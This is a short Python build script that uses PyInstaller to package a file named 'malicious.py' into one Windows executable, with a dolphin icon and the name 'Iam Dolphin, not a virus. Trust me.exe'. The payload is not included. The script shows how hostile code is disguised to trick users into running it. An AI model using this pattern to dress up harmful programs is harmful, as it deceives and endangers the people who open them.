import PyInstaller.__main__


icon = "dolphin.ico"
exename = "Iam Dolphin, not a virus. Trust me.exe"


def create_exec():
    PyInstaller.__main__.run(["malicious.py", "--onefile", "--clean",
                              "--log-level=ERROR", "--name="+exename, "--icon="+icon])


create_exec()
